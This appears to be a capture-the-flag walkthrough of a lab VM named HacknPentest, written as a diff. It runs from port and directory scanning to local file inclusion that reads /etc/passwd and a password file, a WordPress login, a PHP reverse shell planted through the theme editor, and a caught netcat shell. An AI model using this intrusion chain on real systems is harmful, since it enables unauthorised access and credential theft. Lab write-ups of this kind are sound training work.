@@ -1,0 +1,312 @@
+nmap result :
+=============
+
+$ ./nmapAutomator.sh --host 192.168.0.110 -t full
+
+Running a full scan on 192.168.0.110
+
+Host is likely running Linux
+                                                                                                                                                                               
+                                                                                                                                                                               
+---------------------Starting Full Scan------------------------                                                                                                                
+                                                                                                                                                                               
+
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+
+Making a script scan on all ports
+                                                                                                                                                                               
+
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
+|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
+|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: HacknPentest
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+---------------------Finished all scans------------------------
+
+$ curl 192.168.0.110
+<html>
+<title>HacknPentest</title>
+<body>
+ <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" />
+</body>
+
+</html>
+
+$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 192.168.0.110
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.0.110
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/03/25 11:38:00 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/.hta (Status: 403)
+/dev (Status: 200)
+/index.php (Status: 200)
+/javascript (Status: 301)
+/server-status (Status: 403)
+/wordpress (Status: 301)
+
+$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 192.168.0.110 -x .txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.0.110
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt
+[+] Timeout:        10s
+===============================================================
+2021/03/25 11:41:36 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.hta.txt (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.txt (Status: 403)
+/dev (Status: 200)
+/index.php (Status: 200)
+/javascript (Status: 301)
+/secret.txt (Status: 200)
+/server-status (Status: 403)
+/wordpress (Status: 301)
+
+$ curl 192.168.0.110/secret.txt
+Looks like you have got some secrets.
+
+Ok I just want to do some help to you. 
+
+Do some more fuzz on every page of php which was finded by you. And if
+you get any right parameter then follow the below steps. If you still stuck 
+Learn from here a basic tool with good usage for OSCP.
+
+https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
+ 
+
+//see the location.txt and you will get your next move//
+
+
+$ wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw 12 http://192.168.0.110/index.php?FUZZ
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.0.110/index.php?FUZZ
+Total requests: 951
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                       
+=====================================================================
+
+000000341:   200        7 L      19 W       206 Ch      "file"                                                                                                        
+
+Total time: 0
+Processed Requests: 951
+Filtered Requests: 950
+Requests/sec.: 0
+
+$ curl 192.168.0.110/index.php?file=location.txt
+<html>
+<title>HacknPentest</title>
+<body>
+ <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" />
+</body>
+
+Do something better <br><br><br><br><br><br>ok well Now you reah at the exact parameter <br><br>Now dig some more for next one <br>use 'secrettier360' parameter on some other php page for more fun.
+</html>
+
+
+$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 192.168.0.110 -x .php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.0.110
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2021/03/25 11:40:54 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.hta.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/dev (Status: 200)
+/image.php (Status: 200)
+/index.php (Status: 200)
+/index.php (Status: 200)
+/javascript (Status: 301)
+/server-status (Status: 403)
+/wordpress (Status: 301)
+
+
+$ wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw 17 http://192.168.0.110/image.php?secrettier360=FUZZ
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.0.110/image.php?secrettier360=FUZZ
+Total requests: 951
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                       
+=====================================================================
+
+000000257:   200        13 L     43 W       328 Ch      "dev"                                                                                                         
+
+Total time: 1.643792
+Processed Requests: 951
+Filtered Requests: 950
+Requests/sec.: 578.5402
+
+
+$ curl 192.168.0.110/image.php?secrettier360=dev
+<html>
+<title>HacknPentest</title>
+<body>
+ <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
+</body>
+finaly you got the right parameter<br><br><br><br>hello,
+
+now you are at level 0 stage.
+
+In real life pentesting we should use our tools to dig on a web very hard.
+
+Happy hacking. 
+</html>
+
+$ curl 192.168.0.110/image.php?secrettier360=/dev ----------> LFI (Local File Inclusion)
+<html>
+<title>HacknPentest</title>
+<body>
+ <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
+</body>
+finaly you got the right parameter<br><br><br><br></html>
+
+$ curl 192.168.0.110/image.php?secrettier360=/etc/passwd
+<html>
+<title>HacknPentest</title>
+<body>
+ <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
+</body>
+finaly you got the right parameter<br><br><br><br>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:117::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
+mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
+saket:x:1001:1001:find password.txt file in my directory:/home/saket:
+sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
+</html>
+
+$ curl 192.168.0.110/image.php?secrettier360=/home/saket/password.txt
+<html>
+<title>HacknPentest</title>
+<body>
+ <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
+</body>
+finaly you got the right parameter<br><br><br><br>follow_the_ippsec
+</html>
+
+==================================================================================
+>> login to wordpress admin panel using : victor:follow_the_ippsec
+>> Writeable php file found http://192.168.0.110/wordpress/wp-admin/theme-editor.php?file=secret.php&theme=twentynineteen
+>> upload reverse shell by pestestmonkey : $ leafpad /usr/share/webshells/php/php-reverse-shell.php
+>> nc -nlvp 443
+>> http://192.168.0.110/wordpress/wp-content/themes/twentynineteen/secret.php
+
+$ curl http://192.168.0.110/wordpress/wp-content/themes/twentynineteen/secret.php
+
+$ nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [192.168.0.109] from (UNKNOWN) [192.168.0.110] 37428
+Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 09:32:56 up  9:36,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ python -c "import pty; pty.spawn('/bin/bash')"
+www-data@ubuntu:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@ubuntu:/$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (root) NOPASSWD: /home/saket/enc
+
